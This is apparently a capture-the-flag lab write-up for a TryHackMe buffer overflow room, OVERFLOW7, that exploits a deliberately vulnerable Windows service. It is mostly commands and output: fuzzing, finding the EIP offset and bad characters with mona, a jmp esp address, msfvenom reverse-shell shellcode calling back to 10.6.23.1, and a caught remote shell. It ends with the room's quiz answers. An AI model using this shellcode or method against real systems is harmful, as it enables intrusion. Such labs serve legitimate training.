# OVERFLOW7
## Mona Configuration
```
!mona config -set workingfolder C:\mona\%p
```
## Fuzzing
```
user@arch:~/cyber/thm/bufferoverflowprep/OVERFLOW 7$ ./fuzzer.py
Fuzzing with 100 bytes
Fuzzing with 200 bytes
Fuzzing with 300 bytes
Fuzzing with 400 bytes
Fuzzing with 500 bytes
Fuzzing with 600 bytes
Fuzzing with 700 bytes
Fuzzing with 800 bytes
Fuzzing with 900 bytes
Fuzzing with 1000 bytes
Fuzzing with 1100 bytes
Fuzzing with 1200 bytes
Fuzzing with 1300 bytes
Fuzzing with 1400 bytes
Fuzzing crashed at 1400 bytes
```
## Controlling EIP
```
user@arch:~/cyber/thm/bufferoverflowprep/OVERFLOW 7$ cyclic 1800
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaakgaakhaakiaakjaakkaaklaakmaaknaakoaakpaakqaakraaksaaktaakuaakvaakwaakxaakyaakzaalbaalcaaldaaleaalfaalgaalhaaliaaljaalkaallaalmaalnaaloaalpaalqaalraalsaaltaaluaalvaalwaalxaalyaalzaambaamcaamdaameaamfaamgaamhaamiaamjaamkaamlaammaamnaamoaampaamqaamraamsaamtaamuaamvaamwaamxaamyaamzaanbaancaandaaneaanfaangaanhaaniaanjaankaanlaanmaannaanoaanpaanqaanraansaantaanuaanvaanwaanxaanyaanzaaobaaocaaodaaoeaaofaaogaaohaaoiaaojaaokaaolaaomaaonaaooaaopaaoqaaoraaosaaotaaouaaovaaowaaoxaaoyaaozaapbaapcaapdaapeaapfaapgaaphaapiaapjaapkaaplaapmaapnaapoaappaapqaapraapsaaptaapuaapvaapwaapxaapyaapzaaqbaaqcaaqdaaqeaaqfaaqgaaqhaaqiaaqjaaqkaaqlaaqmaaqnaaqoaaqpaaqqaaqraaqsaaqtaaquaaqvaaqwaaqxaaqyaaqzaarbaarcaardaareaarfaargaarhaariaarjaarkaarlaarmaarnaaroaarpaarqaarraarsaartaaruaarvaarwaarxaaryaar
```
Program crashes with `61636E61` in the EIP register
```
user@arch:~/cyber/thm/bufferoverflowprep/OVERFLOW 7$ python -c 'print(bytes.fromhex("61636E61")[::-1].decode())'
anca
```
```
user@arch:~/cyber/thm/bufferoverflowprep/OVERFLOW 7$ cyclic -l anca
1306
```
Offset to EIP is `1306` bytes
## Finding Bad Chars
In Immunity:
```
!mona bytearray -b "\x00"
```
On attacking box:
```
user@arch:~/cyber/thm/bufferoverflowprep/OVERFLOW 7$ python -c '[print("\\x" + "{:02x}".format(x), end="") for x in range(1,256)]'
\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
```
Re-run exploit and compare bytearray:
```
!mona compare -f C:\mona\oscp\bytearray.bin -a 019EFA30
```
```
mona Memory comparison results
Address                    Status                     BadChars                              Type                       Location
0x019efa30                 Corruption after 139 byte  00 8c 8d ae af be bf fb fc            normal                     Stack
```
Bad chars are `\x00\x8c\xae\xbe\xfb`
## Finding a Jump Point
```
!mona jmp -r esp -b "\x00\x8c\xae\xbe\xfb"
```
```
Log data, item 11
 Address=625011AF
 Message=  0x625011af : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
```
We will jump to `\xaf\x11\x50\x62`
## Payload
```
user@arch:~/cyber/thm/bufferoverflowprep/OVERFLOW 7$ msfvenom -p windows/shell_reverse_tcp LHOST=10.6.23.1 LPORT=4444 EXITFUNC=thread -b "\x00\x8c\xae\xbe\xfb" -f c
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 12 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character (index=3, char=0x00)
Attempting to encode payload with 1 iterations of x86/call4_dword_xor
x86/call4_dword_xor succeeded with size 348 (iteration=0)
x86/call4_dword_xor chosen with final size 348
Payload size: 348 bytes
Final size of c file: 1491 bytes
unsigned char buf[] =
"\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76"
"\x0e\x36\x02\x22\x11\x83\xee\xfc\xe2\xf4\xca\xea\xa0\x11"
"\x36\x02\x42\x98\xd3\x33\xe2\x75\xbd\x52\x12\x9a\x64\x0e"
"\xa9\x43\x22\x89\x50\x39\x39\xb5\x68\x37\x07\xfd\x8e\x2d"
"\x57\x7e\x20\x3d\x16\xc3\xed\x1c\x37\xc5\xc0\xe3\x64\x55"
"\xa9\x43\x26\x89\x68\x2d\xbd\x4e\x33\x69\xd5\x4a\x23\xc0"
"\x67\x89\x7b\x31\x37\xd1\xa9\x58\x2e\xe1\x18\x58\xbd\x36"
"\xa9\x10\xe0\x33\xdd\xbd\xf7\xcd\x2f\x10\xf1\x3a\xc2\x64"
"\xc0\x01\x5f\xe9\x0d\x7f\x06\x64\xd2\x5a\xa9\x49\x12\x03"
"\xf1\x77\xbd\x0e\x69\x9a\x6e\x1e\x23\xc2\xbd\x06\xa9\x10"
"\xe6\x8b\x66\x35\x12\x59\x79\x70\x6f\x58\x73\xee\xd6\x5d"
"\x7d\x4b\xbd\x10\xc9\x9c\x6b\x6a\x11\x23\x36\x02\x4a\x66"
"\x45\x30\x7d\x45\x5e\x4e\x55\x37\x31\xfd\xf7\xa9\xa6\x03"
"\x22\x11\x1f\xc6\x76\x41\x5e\x2b\xa2\x7a\x36\xfd\xf7\x41"
"\x66\x52\x72\x51\x66\x42\x72\x79\xdc\x0d\xfd\xf1\xc9\xd7"
"\xb5\x7b\x33\x6a\x28\x17\x21\x03\x4a\x13\x36\x13\x7e\x98"
"\xd0\x68\x32\x47\x61\x6a\xbb\xb4\x42\x63\xdd\xc4\xb3\xc2"
"\x56\x1d\xc9\x4c\x2a\x64\xda\x6a\xd2\xa4\x94\x54\xdd\xc4"
"\x5e\x61\x4f\x75\x36\x8b\xc1\x46\x61\x55\x13\xe7\x5c\x10"
"\x7b\x47\xd4\xff\x44\xd6\x72\x26\x1e\x10\x37\x8f\x66\x35"
"\x26\xc4\x22\x55\x62\x52\x74\x47\x60\x44\x74\x5f\x60\x54"
"\x71\x47\x5e\x7b\xee\x2e\xb0\xfd\xf7\x98\xd6\x4c\x74\x57"
"\xc9\x32\x4a\x19\xb1\x1f\x42\xee\xe3\xb9\xc2\x0c\x1c\x08"
"\x4a\xb7\xa3\xbf\xbf\xee\xe3\x3e\x24\x6d\x3c\x82\xd9\xf1"
"\x43\x07\x99\x56\x25\x70\x4d\x7b\x36\x51\xdd\xc4";
```
## Exploit
```
user@arch:~/cyber/thm/bufferoverflowprep/OVERFLOW 7$ ./exploit.py
Sending evil buffer...
Done!
```
```
user@arch:~/cyber/thm/bufferoverflowprep/OVERFLOW 7$ nc -lnvp 4444
Connection from 10.10.39.227:49237
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\admin\Desktop\vulnerable-apps\oscp>echo PWNED OVERFLOW7!!!!!!!
echo PWNED OVERFLOW7!!!!!!!
PWNED OVERFLOW7!!!!!!!

C:\Users\admin\Desktop\vulnerable-apps\oscp>
```
## Questions
What is the EIP offset for OVERFLOW7?
```
1306
```
In byte order (e.g. \\x00\\x01\\x02) and including the null byte \\x00, what were the badchars for OVERFLOW7?
```
\x00\x8c\xae\xbe\xfb
```